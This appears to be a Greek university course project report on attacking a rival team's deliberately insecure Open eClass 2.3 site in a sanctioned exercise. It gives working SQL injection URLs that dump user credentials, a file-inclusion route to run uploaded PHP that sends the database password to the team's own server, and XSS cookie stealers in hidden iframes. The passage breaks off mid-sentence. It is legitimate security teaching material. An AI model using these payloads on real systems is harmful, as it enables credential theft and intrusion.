## Open eClass 2.3

Το repository αυτό περιέχει μια __παλιά και μη ασφαλή__ έκδοση του eclass.
Προορίζεται για χρήση στα πλαίσια του μαθήματος
[Προστασία & Ασφάλεια Υπολογιστικών Συστημάτων (ΥΣ13)](https://crypto.di.uoa.gr/csec/), __μην τη
χρησιμοποιήσετε για κάνενα άλλο σκοπό__.


## 2020 Project 1

Εκφώνηση: https://crypto.di.uoa.gr/csec/assets/projects/project1.pdf


### Μέλη ομάδας

- 1115201600042, Ελευθέριος Δημητράς
- 1115201600119, Μιχαήλ Ξανθόπουλος

### Report

Συμπληρώστε εδώ __ένα report__ που
- Να εξηγεί τι είδους αλλαγές κάνατε στον κώδικα για να προστατέψετε το site σας (από την κάθε επίθεση).
- Να εξηγεί τι είδους επιθέσεις δοκιμάσατε στο αντίπαλο site και αν αυτές πέτυχαν.

---

## Defacement (Target: hackerz.csec.chatzi.org)

### Grant Admin Access

#### -> 1ος Τρόπος (Επιτυχής)
- Οι πρώτες επιθέσεις που δοκιμάσαμε ήταν να κάνουμε ___SQL Injection___ και να πάρουμε τους κωδικούς από τη βάση. \
Δοκιμάσαμε αρχικά στη σελίδα ___contactadmin.php___ η οποία επέστρεψε επιτυχώς τα αποτελέσματα που ανανμέναμε.

   _Με το παρακάτω url_:
   > http://hackerz.csec.chatzi.org/modules/auth/contactadmin.php?userid=1' union select 1,group_concat(0x3c62723e,user_id,0x3a,0x3a,nom,0x3a,0x3a,prenom,0x3a,0x3a,username,0x3a,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from user-- -
  
   Παίρνουμε όλα τα δεδομένα των users από τη βάση μαζί με τους hashed κωδικούς τους.\
   Ενδεικτικά το hash του κωδικού του drunkadmin είναι: __63d786jrfu5l33b3jc59aq7s32__ :)
   
  
- Στη συνέχεια φτιάξαμε χρήστη και δοκιμάσαμε αν μπορούμε να ανεβάσουμε αρχείο __.php__. Το ανέβασμα έγινε με επιτυχία \
  και αρχίσαμε να σκεφτόμαστε τρόπους να το εκμεταλλευτούμε αυτό με κάποιο __RFI/LFI__. Τελικά βρήκαμε ένα σημείο στο \
  οποίο υπήρχε ένα εξίσου μεγάλο κενό, από το οποίο μπορέσαμε να εκτελέσουμε το php μας.

   _Με το παρακάτω url_:
   > http://hackerz.csec.chatzi.org/modules/admin/sysinfo/index.php?lng=../../../../../<path to php\>
  
   μπορούμε να εκτελέσουμε οποιοδήποτε php file υπάρχει μέσα στο server. Η μεταβλητή $lng δεν αρχικοποιείται μέσα στο \
   αρχείο sysinfo/index.php και μπορεί να δοθεί από το url οπιαδήποτε τιμή θέλουμε. \
   Εκτελείται η ακόλουθη εντολή μέσα στο sysinfo/index.php: \
   
   `require('./includes/lang/' . $lng . '.php');` \
   
   από την οποία εμφανώς μπορεί να δοθεί ένα οποιοδήποτε μονοπάτι προς κάποιο php και να εκτελεστεί χωρίς κανέναν έλεγχο.
   
   Με αυτόν τον τρόπο καταφέραμε να υποκλέψουμε τα δεδομένα του αρχείου config.php και να πάρουμε σε _plain text_ τον κωδικό \
   της βάσης και του drunkadmin (_δεδομένου ότι είναι ο ίδιος_) και πήραμε admin access!
   
   Το περιεχόμενο του php file που χρησιμοποιήθηκε ήταν το παρακάτω:\
   `require('../../../config/config.php');` \
   `header('Location: http://cybergh0sts.csec.chatzi.org/index.php?passwd='. $mysqlPassword);`
   
   Ουσιαστικά φόρτωνε το config.php και έκανε ανακατέυθυνση στη δικιά μας σελίδα δίνοντας τον κωδικό σαν κάποια μεταβλητή \
   ___passwd___ την οποία πήραμε από τα logs του server μας.
   

#### -> 2ος Τρόπος (Επιτυχής)
- Ένας ακόμα τρόπος με τον οποίο καταφέραμε να πάρουμε __admin access__, είναι μέσω υποκλοπής του cookie του drunkadmin. \
  Οι αντίπαλοι μας δεν είχαν χρησιμοποιήσει το ___HTTP Only___ ώστε να απαγορεύει πρόσβαση του cookie από τη JavaScript \
  και με έναν συνδυασμό __CSRF__ & __XSS__ που εκμεταλλευτήκαμε καταφέραμε να πάρουμε το cookie.
  
  Το __XSS__ βρίσκεται στη σελίδα: ___agenda.php___
  
  Με χρήση του παρακάτω κώδικα στη σελίδα μας cybergh0sts.puppies.chatzi.org καταφέραμε να πάρουμε τις πληροφορίες που θέλουμε: \
  `<iframe width="0" height="0" style="visibility: hidden;" src='http://hackerz.csec.chatzi.org/modules/agenda/myagenda.php?month=6&year=2020<script>window.location.href = "http://cybergh0sts.csec.chatzi.org/index.php?OlympusHasFallen=".concat(document.cookie);</script>'></iframe>`
   
   Με το παραπάνω __iframe__, το οποίο ήταν hidden, εκτελούσαμε το __XSS__ το οποίο το ανακατεύθυνε στη δικιά μας σελίδα και \
   ενσωμάτωνε στο URL το cookie του drunkadmin και το παίρναμε εμείς από τα logs του server μας.
   
   Στη συνέχεια, επειδή θα έπρεπε να κρατήσουμε το browser session ενεργό προκειμένου να μη χάσουμε τη πρόσβαση μέσω του cookie \
   θα πηγαίναμε στη σελίδα: ___eclassconf.php___ η οποία είναι η σελίδα στην οποια υπάρχει η φόρμα αλλαγής των στοιχείων πρόσβασης \
   στη βάση. Έτσι παρόλο που το πεδίο του κωδικού ήταν κρυμμένο, με ένα απλό Inspect Element μπορούσαμε να δούμε το attribute: _value_ \
   της φόρμας στο πεδίο του password και να βρούμε άμεσα τον κωδικό της βάσης, που εν προκειμένω ήταν και ίδιος με του drunkadmin.
   
   Τελικά το cookie είναι: __63d786jrfu5l33b3jc59aq7s32__! :) 

#### -> 3ος Τρόπος (Ασφαλισμένο, αλλά έχει δοκιμαστεί σε unpatched version και λειτουργεί)
- Ένα πολύ ενδιαφέρον attack μέσω πάλι ενός συνδυασμού __CSRF__ & __XSS__, βρίσκεται στη σελίδα ___eclassconf.php___.\
  Σε αυτήν τη σελίδα, όπως περιγράφηκε στο προηγούμενο attack, υπάρχει ο κωδικός της βάσης στο attribute _value_ στο \
  πεδίο της φόρμας για τον κωδικό.
  
  Το __XSS__ σε αυτήν τη σελίδα εντοπίζεται στα σημεία που γίνεται \_POST και \_GET. Έτσι, αν βάλουμε στο URL ενα '/">' στο \
  μετά το .php, θα χαλάσει η μορφοποίηση της σελίδας και θα κάνει embed δίπλα από τα attrinutes _method="get"_ και _method="post"_
  οτιδήποτε γράψουμε μετά το '/">'.
  
  Για παράδειγμα γράφοντας:
  > http://hackerz.csec.chatzi.org/modules/admin/eclassconf.php/"><script\>alert('You have been H4cked')<script\>
  
  Εκτελείται το __XSS__ κανονικά, γιατί ουσιαστικά κλείνουμε το <form action="...php/"> method="post"> </form> και κάνουμε το \
  υπόλοιπο ___payload___ που δίνουμε να ενσωματωθεί κανονικά στον κώδικα και να εκτελεστεί.
  
  
  Έτσι κατασκευάσαμε το παρακάτω ___payload___:\
  `<script>document.ready(document.body.insertAdjacentHTML('afterend', <img src="image_url" alt="" onload="window.location.href='http://cybergh0sts.csec.chatzi.org/index.php?OlympusHasFallenAgain_Password='.concat(document.getElementsByName('formmysqlPassword')[0].getAttribute('value'))"/>))</script>`
  
  Δοκιμάστηκε η χρήση διπλού εμφωλευένου <script> στη θέση του <img/> το οποίο έγινε επιτυχώς embed στον κώδικα της σελίδας όπως \
  θέλαμε, αλλά δεν εκτελούνταν εξαιτίας της χρήσης του function, __document.body.insertAdjacentHTML__ το οποίο δεν εκτελεί \
  τον κώδικα που ενσωματώνει. Έτσι για να ξεπεραστεί αυτό το εμπόδιο έγινε η χρήση του <img/>.
  
  Με αυτόν τον τρόπο, μόλις φορτωθεί η εικόνα θα εκτελέσει το script που έχουμε ενσωματώσει μέσα και με τον ίδιο τρόπο που \
  περιγράφηκε για την agenda, θα ανακατευθύνει στο δικό μας site τις πληροφορίες που θέλουμε, οι οποίες είναι το ___username___ και \
  το ___password___ διαβάζοντας τον HTML κώδικα.
  
  Ωστόσο, υπήρχαν προβλήματα κωδικοποίησης, επειδή στη θέση που βάζουμε το <img/> γίνονται escape πολλοί από τους χαρακτήρες. \
  Έτσι, ξεπεράσαμε και αυτό το πρόβλημα μέσω της χρήσης του __''.concat(String.fromCharCode(ASCII NUMBER))__ το οποίο κωδικοποιεί \
  κάθε μη επιτρεπτό χαρακτήρα και εκτελεί τη συνάρτηση αποκωδικοποίησης παρακάμπτοντας κάθε έλεγχο invalid χαρακτήρων των αντιπάλων. \
  
  Τέλος, επειδή κάποιοι χαρακτήρες συνέχιζαν να αποκόπτωνται μετατρέψαμε όλο το payload του URL σε URL Encoded μορφή. \
  Έτσι, καθ'αυτόν τον τρόπο φτιάξαμε το παρακάτω paylaod το οποίο έκανε όλη τη δουλειά κωδικοποιημένα:
  
  - __Χωρίς Κωδικοποίηση__
  > http://hackerz.csec.chatzi.org/modules/admin/eclassconf.php/"><script>document.ready(document.body.insertAdjacentHTML('afterend', <img src="image_url" alt="" onload="window.location.href='http://cybergh0sts.csec.chatzi.org/index.php?OlympusHasFallenAgain_Password='.concat(document.getElementsByName('formmysqlPassword')[0].getAttribute('value'))"/>))</script>
  
  - __1ο Στάδιο Κωδικοποίησης (_Ιδιαίτερα μεγάλο URL και παρατίθεται ένας μέρος του_)__
  > http://hackerz.csec.chatzi.org/modules/admin/eclassconf.php/"><script>document.ready(document.body.insertAdjacentHTML('afterend', ''.concat(String.fromCharCode(60)).concat('img').concat(String.fromCharCode(32)).concat('src').concat(String.fromCharCode(61))  ...  ))</script>
  
  - __2ο Στάδιο Κωδικοποίησης (_Εξαιρετικά μεγάλο URL, φτάνει το όριο επιτρεπτού URL length και παρατίθεται ένας μέρος του_)__
    > http://hackerz.csec.chatzi.org/modules/admin/eclassconf.php/%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%72%65%61%64%79%28%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%69%6e%73%65%72%74%41%64%6a%61%63%65%6e%74%48%54%4d%4c%28%27  ...  /  ...  
  
---
## Κενά Ασφαλείας και Επιθέσεις

  - __SQL Injections__
       
       Κατά τη διάρκεια της φάσης του defense, σκεφτήκαμε να βρούμε από όσο πιο πολλά αρχεία γίνεται σημεία \
       στα οποία χρησιμοποιούνται μεταβλητές οι οποίες είτε δεν έχουν αρχικοποιηθεί, είτε μπορεί να παρακμφθεί \
       η αρχικοποίηση τους και στη συνέχεια γίνεται χρήση αυτής σε κάποιο SQL Query.
       
       Έτσι, με τροποποίηση του url request δίνουμε στη συγκεκριμένη μεταβλητή μια τιμή που θέλουμε εμείς έτσι \
       ώστε να σπάσουμε το SQL Query και να το κάνουμε να επιστρέψει τα αποτελέσματα που θέλουμε.
       
       Με αυτό το σκεπτικό έγιναν πάνω κάτω όλες οι επιθέσεις για __SQL Injection__
       
       
       - Στη σελίδα ___contactadmin.php___ (_δούλεψε στον target μας_)\
       	 υπάρχει ένα σημαντικό κενό από το οποίο μπορούμε να αντλήσουμε όλα τα δεδομένα της βάσης. Στην περιγραφή \
	 του defacement μας περιγράφηκε η διαδικασία που χρησιμοπιήθηκε.
	 
	 Ουσιαστικά αρχικά ελέγξαμε ότι αν βάλουμε ένα ' δίπλα από το userid=1 χαλάει το SQL Query και εξαφανίζονται \
	 δεδομένα από τη σελίδα
	 
	 > http://hackerz.csec.chatzi.org/modules/auth/contactadmin.php?userid=1'
	 
	 Αυτό μας έκανε να υποψιαστούμε ότι από το συγκεκριμένο query αντλούνται τα δεδομένα που εξαφανίστηκαν από τη \
	 σελίδα. Έτσι έπρεπε να βρούμε τρόπο να πάρουμε αυτά που εμείς θέλουμε.
	 
	 Αρχικά, δοκιμάζουμε να δούμε πόσες στήλες έχει το συγκεκριμένο table πάνω στο οποίο γίνεται το query, ώστε να \
	 μη σπάσουμε το query αυτή τη φορά.
	 
	 > http://hackerz.csec.chatzi.org/modules/auth/contactadmin.php?userid=1' order by 17 -- -
	 
	 Μετά από δοκιμές καταλήξαμε στο ότι το table εχει __17__ στήλες, γιατί στο 18 δεν φόρτωσε σωστά η σελίδα.\
	 να σημειωθεί ότι χρησιμποιήθηκε το -- - στο τέλος, για να σχολιαστεί το υπόλοιπο "πραγματικό" query και να \
	 μη προκαλέσει SQL error.
	 
	 > http://hackerz.csec.chatzi.org/modules/auth/contactadmin.php?userid=1' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 -- -

	 Επειτα, μέσω του παραπάνω ___union select___ είδαμε ποιοι από τους 17 αριθμούς εκτυπώνονται στη θέση των \
	 δεδομένων που εξαφανίστηκαν από τη σελίδα. Αυτές είναι και οι vulnerable στήλες.
	 
	 Έτσι, στη θέση κάποιων από αυτούς τους αριθμούς που εμφανίζονται βάζουμε ένα χρήσιμο payload και λαμβάνουμε \
	 ολόκληρη τη βάση εκτυπωμένη στη σελίδα!
	 
	 > http://hackerz.csec.chatzi.org/modules/auth/contactadmin.php?userid=1' union select 1,group_concat(0x3c62723e,user_id,0x3a,0x3a,nom,0x3a,0x3a,prenom,0x3a,0x3a,username,0x3a,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from user-- -
	 
	 Αυτό το request, όπως ανα φέρθηκε προηγουμένως, επιστρέφει όλα τα δεδομένα των χρηστών που είναι καταχωρημένοι \
	 στο σύστημα, μαζί με του drunkadmin!
	 
       ##### ___Τα δεδομένα εμφανίζονται στη θέση του επωνύμου___


       - Στη σελίδα ___work.php___ (_δούλεψε στον target μας_)\
       	 μπορέσαμε με τον ίδιο ακριβώς τρόπο με του ___contactadmin.php___ να πάρουμε όλα τα δεδομένα της βάσης. Σε αυτό \
	 το σημέιο, χρησιμοποιήσαμε το __id__ που υπάρχει στο URL και χαλώντας το SQL query πήραμε τα αποτελέσματα που θέλουμε.
	 
	 > http://hackerz.csec.chatzi.org/modules/work/work.php?id=' union (select group_concat(0x3c62723e,user_id,0x3a,0x3a,nom,0x3a,0x3a,prenom,0x3a,0x3a,username,0x3a,0x3a,password) from eclass.user) -- -

       ##### ___Τα δεδομένα εμφανίζονται σε λευκη σελίδα με το SQL error μαζί___
	 
	 
       - Στη σελίδα ___reply.php___ (_δε λειτούργησε στον target μας, δουλεύει σε unpatched_) \
       	 μπορούμε να χρησιμοποιήσουμε τη μεταβητή __topic__ ώστε με τον ίδιο τρόπο με παραπάνω να πάρουμε τα περιεχόμενα \
	 της βάσης.
	 
	> http://hackerz.csec.chatzi.org/modules/phpbb/reply.php?forum=1&topic=1 and 1=2) union all select 1,group_concat(0x3c62723e,user_id,0x3a,0x3a,nom,0x3a,0x3a,prenom,0x3a,0x3a,username,0x3a,0x3a,password),3,4 from eclass.user limit 2 -- -

       ##### ___Τα δεδομένα εμφανίζονται στο breadcrumb___
	 
	 
       - Στη σελίδα ___newtopic.php___ (_δε λειτούργησε στον target μας, δουλεύει σε unpatched_) \
       	 μπορούμε να χρησιμοποιήσουμε τη μεταβητή __forum__ ώστε με τον ίδιο τρόπο με παραπάνω να πάρουμε τα περιεχόμενα \
	 της βάσης.
	 
	> http://hackerz.csec.chatzi.org/modules/phpbb/newtopic.php?forum=1' and '1'='2') union (select group_concat(0x3c62723e,user_id,0x3a,0x3a,nom,0x3a,0x3a,prenom,0x3a,0x3a,username,0x3a,0x3a,password),2,3 from eclass.user) -- -

       ##### ___Τα δεδομένα εμφανίζονται στο breadcrumb___
	 
	 
       - Στη σελίδα ___unregcours.php___ (_δε λειτούργησε στον target μας, δουλεύει σε unpatched_) \
       	 μπορούμε να χρησιμοποιήσουμε τη μεταβητή __cid__ ώστε με τον ίδιο τρόπο με παραπάνω να πάρουμε τα περιεχόμενα \
	 της βάσης.
	 
	> http://hackerz.csec.chatzi.org/modules/unreguser/unregcours.php?u=4&cid=' union select group_concat(0x3c62723e,user_id,0x3a,0x3a,nom,0x3a,0x3a,prenom,0x3a,0x3a,username,0x3a,0x3a,password) from eclass.user -- -

       ##### ___Τα δεδομένα εμφανίζονται στη θέση εμφάνισης του κωδικού του μαθήματος (πχ ΤΜΑ100)___
	 
	  
       - Στη σελίδα ___unpgrade.php___, ___upgrade/index.php___ (_δε λειτούργησε στον target μας, δουλεύει σε unpatched_) \
       	 μπορούμε με ένα πολύ απλό SQL injection να συνδεθούμε με πλήρη admin access σε όλες τις σελίδες!\
	 Η σελίδα έχει ένα login page που αν βάλουμε στο username: \
	 -> drunkadmin' -- - \
	 θα παρακάμψει τον έλεγχο του κωδικού και θα πάρουμε πλήρη δικαιώματα διαχειριστή.
	 
	 
	 
	 

  - __XPATH Injections / Duplicate Error Injection__
       
       Μια παραλλαγή των παραπάνω SQL Injections, αποτελούν τα XPATH και Duplicate Error Injections. \
       Με τις προηγούμενες μεθόδους, κάναμε injections σε __SELECR__ statements. Με αυτά τα injections \
       μπορούμε να εκμεταλλευτούμε και να αντλήσουμε πληροφορίες από __UPDATE__, __INSERT__ και __DELETE__ statements.
       
       Εντοπίστηκαν τέτοιου είδους injections σε δύο σημεία.
       
       - Στη σελίδα ___phpbb/index.php___ (_δούλεψε στον target μας_) \
       	 στα καμπανάκια γίνεται update το state στη βάση. Έτσι μέσω των μεταβλητων __forumnotify__ και __forumcatnotify__, \
	 μπορούμε να πάρουμε χρήσιμη πληροφορία μέσω πολλαπλών εμφολευμένων __SELECT__, όπου και επιστρέφει το πιο printable \
	 αποτέλεσμα ή μέσω συναρτήσεων όπως οι __updatexml()__ και __extractvalue()__.
	 
	 
	 > http://hackerz.csec.chatzi.org/modules/phpbb/index.php?forumcatnotify=' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT group_concat(username,0x3a,password) FROM eclass.user LIMIT 0,1) ) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or ' &cat_id=2
	 
	 > http://hackerz.csec.chatzi.org/modules/phpbb/index.php?forumcatnotify=' or extractvalue(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM eclass.user limit 0,1))) or' &cat_id=2
	 
	 > http://hackerz.csec.chatzi.org/modules/phpbb/index.php?forumcatnotify=' or updatexml(0,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM eclass.user limit 0,1)),0) or '&cat_id=2

           
       - Στη σελίδα ___viewforum.php___ (_δούλεψε στον target μας_) \
       	 στα καμπανάκια γίνεται update το state στη βάση. Έτσι μέσω της μεταβλητής __topicnotify__, μπορούμε να πάρουμε \
	 χρήσιμη πληροφορία μέσω πολλαπλών εμφολευμένων SELECT, όπου και επιστρέφει το πιο printable αποτέλεσμα ή μέσω \
	 συναρτήσεων όπως οι __updatexml()__ και __extractvalue()__.
	 
	 
	 > http://hackerz.csec.chatzi.org/modules/phpbb/viewforum.php?forum=1&topicnotify=' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT group_concat(username,0x3a,password) FROM eclass.user LIMIT 0,1) ) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or ' &topic_id=1
	 
	 > http://hackerz.csec.chatzi.org/modules/phpbb/viewforum.php?forum=1&topicnotify=' or extractvalue(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM eclass.user limit 0,1))) or' &topic_id=1
	 
	 > http://hackerz.csec.chatzi.org/modules/phpbb/viewforum.php?forum=1&topicnotify=' or updatexml(0,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM eclass.user limit 0,1)),0) or '&topic_id=1

       
       
	 
	 
  - __XSS__
       
       Με αυτό το είδος της επίθεσης καταφέραμε να πάρουμε το cookie του drunkadmin, όπως αναφέρθηκε στο ___Defacement Section___. \
       Ουσιαστικά σε κάθε σελίδα __.php__ που τυπώνει κάτι ή/και έχει μέσα κάποια φόρμα με \_GET ή \_POST method, μπορέι να \
       γίνει XSS attack. Επιπλέον, σε κάθε σελίδα που μπορούμε σύμφωνα με τα προηγούμενο attack να προκαλέσουμε κάποιο SQL error, \
       τότε μπορούμε να κάνουμε κάποιο __XSS attack__ κάνοντάς το να τυπωθεί μέσα στο SQL error.
       
       Όπως περιγράφηκε ___Defacement Section___, αν βάλουμε στην κατάληξη του URL: \
       -> http://.../file.php/">
       Τότε "σπάμε" τη μορφοποίηση του αρχείου και ενσωματώνουμε ακριβώς δίπλα στα \_GET ή \_POST methods το δικό μας script \
       το οποίο και μπορεί να μας δώσει χρήσιμη πληροφορία υπό προϋποθέσεις και συνήθως σε συνδυασμό με κάποιο __CSRF__ attack \
       μπορούμε να πάρουμε πολλές πληροφορίες, από cookies, μέχρι κωδικούς βάσης και usernames. 
       _(Περιγράφηκαν και στο ___Defacement Section___ αναλυτικά)_
       
       Τα πιο σημαντικά από αυτά, εντοπίστηκαν στις σελίδες: \
       1. ___agenda.php___   (___Reflected XSS___)   \[_δούλεψε στον target μας_]
       > http://hackerz.csec.chatzi.org/modules/agenda/myagenda.php?month=6&year=2020<script>alert('You have been H4cked')</script>
       
       2. ___eclass_conf.php___  (___Reflected XSS___)   \[_δε λειτούργησε στον target μας, δουλεύει σε unpatched_]
       > http://hackerz.csec.chatzi.org/modules/admin/eclassconf.php/"><script>alert('You have been H4cked')</script>
       
       3. ___newuser.php___   (___Stored XSS___)   \[_δούλεψε στον target μας_]
       > Μπορούμε στα πεδία του _"Ονόματος"_ και του _"Επωνύμου"_ να βάλουμε σαν δεδομένα το \
       > <script\>alert('You have been H4cked')</script\> και γινόταν κανονικά η καταχώρηση του νέου χρήστη. \
       > Τότε εμφάνιζε τα ___alerts___ και κατ'επέκταση μπορεί να χρησιμοποιηθεί για να αλλάξει τη δομή και τη \
       > διαμόρφωση της αρχικής και πολλών άλλων σελίδων.
       
       4. ___conference.php___   (___Stored XSS___)   \[_δε λειτούργησε στον target μας, δουλεύει σε unpatched_]
       > Μπορούμε να υποβάλουμε ένα νέο μήνυμα που να περιέχει σαν πληροφορία το <script\>alert('You have been H4cked')</script\> \
       > και αυτό καταγράφεται στα αρχεία του συστήματος. Έτσι κάθε φορά που φορτώνει τα σταλθέντα μηνύματα θα εκτελείται το \
       > script που έχει καταχωρηθεί. 
       
       5. ___conference.orig.php___   (___Stored XSS___)   \[_δε λειτούργησε στον target μας, δουλεύει σε unpatched_]
       > Με τον ίδιο τρόπο με το απλό ___conference.php___ στη φόρμα που έχει κάτω κάτω, μπορεί να καταχωρηθεί ένα νέο \
       > μήνυμα που θα περιέχει το <script\>alert('You have been H4cked')</script\>
       
       6. ___refresh_chat.php___   (___Stored XSS___)   \[_δε λειτούργησε στον target μας, δουλεύει σε unpatched_]
       > Με αυτό το αρχείο μπορούμε να φορτώσουμε όλα τα καταχωρημένα μηνύματα και κατ'επέκταση να εκτελεστεί το script μας.
       
       7. ___refresh_chat.orig.php___   (___Stored XSS___)   \[_δε λειτούργησε στον target μας, δουλεύει σε unpatched_]
       > Με αυτό το αρχείο μπορούμε να φορτώσουμε όλα τα καταχωρημένα μηνύματα και κατ'επέκταση να εκτελεστεί το script μας.
       
       8. ___newtopic.php___, ___reply.php___   (___Stored XSS___)   \[_δε λειτούργησε στον target μας, δουλεύει σε unpatched_]
       > Μπορούμε σε αυτά τα αρχεία να ενσωματώσουμε scripts στο όνομα του νέου θέματος που θέλουμε να φτιάξουμε και στο εργαλείο \
       > που δίνει για συγγραφή του νέου μηνύματος, έχει ένα tool που τροποποιεί και ενσωματώνει HTML κώδικα. Έτσι πολύ εύκολα, \
       > μπορεί να ενσωματωθεί οποιοδήποτε script και οποιοσδήποτε κώδικας HTML.
       

	Ένα πολύ σημαντικό XSS attack βρίσκεται στο ___conference.orig.php___ με αλλαγή της μεταβλητής \
	__MCU__ (_no it's not Marvel's Cinematic Universe but it's still epic!_:p)
	
	Σε αυτήν τη μεταβλητή μπορούμε να παρακάμψουμε πολύ εύκολα την αρχικοποίησή της και να ενσωματώσουμε ακόμα και \
	κώδικα σχεδόν. Η χρήση της μεταβλητής αυτής είναι σε __3__ σημεία μέσα στο αρχείο και ενσωματώνεται στο εργαλείο \
	που τυπώνει το τελικό HTML αποτέλεσμα της σελίδας. Έτσι, μπορούμε με κατάλληλες τροποποιήσεις και escape sequences \
	να ενσωματώσουμε σχεδόν και php κώδικα!
	
	Δεν έχει ολοκληρωθεί το attack στο παρακάτω παράδειγμα, αλλά είναι πολύ κοντά στην επίλυση των όποιοων θεμάτων \
	του κόβουν τη λειτουργικότητα. Δίνεται το Cookie Stealer script.
	
	Μπορεί να ενσωματώσει τον οποιονδήποτε HTML κώδικα μέσα στη σελίδα και να τρέξει. Για παράδειγμα κατάφερα να ενσωματώσω \
	iframes και να τρέξω εσωτερικά σε αυτά πολλαπλές σελίδες οι οποίες θα μπορούσαν να στείλουν πολλαπλά δεδομένα στους server μας.
	
       ##### Cookie Stealer
	> http://hackerz.csec.chatzi.org/modules/conference/conference.orig.php?MCU=<script>window.location.href = "http://cybergh0sts.csec.chatzi.org/index.php?OlympusHasFallenAgain=".concat(document.cookie);</script>
	
	 
	 
	 
	 
  - __CSRF__
       
       Αυτό το attack σε συνδυασμό με τα παραπάνω Reflected XSS χρησιμοποιήθηκαν για την υποκλοπή του cookie του drunkadmin. \
       Φτιάξαμε ένα site στο puppies το οποίο ενσωμάτωνε ένα κρυφό iframe το οποίο έκανε ανακατεύθυνση σε μια σελίδα που ήταν \
       ευάλωτη σε XSS attacks.
       
       `<iframe width="0" height="0" style="visibility: hidden;" src='http://hackerz.csec.chatzi.org/modules/agenda/myagenda.php?month=6&year=2020<script>window.location.href = "http://cybergh0sts.csec.chatzi.org/index.php?OlympusHasFallen=".concat(document.cookie);</script>'></iframe>`
       
	
	 
	 
	 
	 
  - __RFI/LFI__
       
       Ήταν ανοιχτή η δυνατότητα υποβολής .php αρχείου. Έτσι απευθείας, εκμεταλλευόμενοι όλα τα παραπάνω attacks μπορούσαμε \
       να πάρουμε τον έλεγχο της βάσης και να βρούμε το που είναι αποθηκευμένα τα αρχεία που ανεβάσαμε και με τι όνομα. \
       Αυτό παρακάμπτει ακόμα και τα κρυφά hashes των φακέλων και των αρχείων και το μόνο που έμενε ήταν να βρούμε έναν τρόπο \
       να εκτελέσουμε αυτά τα php files. 
       
       Αυτό θα μπορούσε να γίνει αν υπήρχε listing στους καταλόγους πολύ εύκολα. Αλλά εν προκειμένω που δεν υπήρχε αυτή η \
       δυνατότητα, χρησιμοποιήσαμε SQL Injection για να βρούμε τα ονόματα των φακέλων και των αρχείων.
       
       Ωστόσο, το πρώτο που κάναμε ήταν να ανεβάσουμε ένα αρχείο το οποιο έκανε include το config.php και έκανε ένα request \
       στο server μας στέλνοντας τον κωδικό της βάσης σε εμάς.
       
       Τώρα ο τρόπος με τον οποίο εκτελέστηκαν τα php files, είναι από ένα και μοναδικό αρχείο του admin στο οποίο έχουν \
       πρόσβαση όλοι και δε λαμβα΄νεται κανένας έλεγχος για τη μεταβλητή που δίνεται ως παράμετρος. Έχει αναλυθεί και στο \
       ___Defacement Section___. Από αυτήν τη σελίδα μπορεί να εκτελεστεί κάθε php που υπάρχει στο server.
       
       > http://hackerz.csec.chatzi.org/modules/admin/sysinfo/index.php?lng=../../../../../<path to php\>
       
       Με αυτό το URL, μπορούμε να ανακατευθύνουμε την εκτέλεση σε κάθε πιθανό php που υπάρχει στον server!
       
       
       Αξίζει να σημειωθεί ότι ακόμα και αν δεν υπήρχε η δυνατότητα να κάνουμε κάπου SQL injection για να πάρουμε τα κρυφά \
       ονόματα των φακέλων και των αρχείων που ανεβάσαμε, υπάρχει μια ακόμα πολύ καλή δυνατότητα από την οποία μπορούμε \
       να παρακάμψουμε όλα τα hashes και να δημιουργήσουμε έναν φάκελο με δικό μας όνομα και να το προσπελάσουμε μέσω του \
       sysinfo/index.php πολύ εύκολα και άμεσα.
       
       Αυτό το σημείο βρίσκεται στο ανέβασμα κάποιας εργασίας στο ___work.php___.
       
       Μπορείς αν δεν το έχουν προβλέψει οι αντίπαλοι, αλλάζοντας το id πάνω στο URL να "σπάσεις" τη διαδικασία ανεβάσματος. \
       Αν βάλουμε για παράδειγμα για id ένα μεγαλύτερο από το μέγιστο που υπάρχει, θα φτιαχτεί ένας φάκελος με όνομα τον επόμενο \
       αύξοντα αριθμό του τλεευταίου id. Για παράδειγμα θα φτιαχτεί ένας φάκελος με όνομα 2 ή 3. Έτσι εφόσον το όνομα των αρχειων \
       που μπαίνουν μέσα παίρνουν σαν όνομα το Ονοματεπώνυμο και το ΑΜ του χρήστη που την ανέβασε. Άρα ξέρουμε πλέον όλα τα στοιχεία \
       του php που ανεβάσαμε και μπορούμε να το τρέξουμε χωρίς κανένα άλλο attack.
       
       
       
---
## Defense Tactics
       
Απόκτηση δικαιωμάτων διαχειριστή

cookie stealer -> Αρχικά εντοπίσαμε ένα κενό στο modules/agenda/myagenda.php στο οποίο
μπορούσαμε να κάνουμε xss προσθέτοντας το ?month=6&year=2020<script>xss</script> στο URL
έπειτα φτιάξαμε ένα script που κλέβει το cookie και κάνει ένα request στον server του 
online vm μας καλώντας το παρακάτω
http://hackerz.csec.chatzi.org/modules/agenda/myagenda.php
?month=6&year=2020<script>window.location.href = "http://cybergh0sts.csec.chatzi.org/index.php?OlympusHasFallen=".concat(document.cookie);</script>
Έπειτα τον ενσωματώσαμε σε ένα iframe που ήταν hidden , φτιάξαμε μια σελίδα στο puppies και βάλαμε το iframe μέσα . 
Τέλος στείλαμε email στον drunk admin , ο οποίος ανοίγοντάς το ουσιαστικά μας έδωσε το cookie του . 

rfi -> Αρχικά εντοπίσαμε ένα κενό στο /modules/admin/sysinfo/index.php στο οποίο μπορούμε 
να κάνουμε rfi κάποιου αρχείου αν προσθέσουμε ?lng=(path κάποιου αρχείου) στο τέλος του URL .
Έτσι φτιάξαμε ένα php το οποίο κάνει require το config.php κανει έπειτα παίρνει την μεταβλητή
